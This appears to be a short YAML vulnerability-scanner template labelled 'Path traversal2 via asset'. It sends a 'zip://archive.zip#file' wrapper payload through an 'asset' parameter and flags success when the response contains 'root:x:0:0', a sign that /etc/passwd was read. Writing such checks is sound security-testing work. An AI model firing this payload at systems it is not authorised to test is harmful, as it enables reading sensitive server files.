id: lfi2-120
name: 'Path traversal2 via asset'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via asset'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      asset:
        - 'zip://archive.zip#file'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
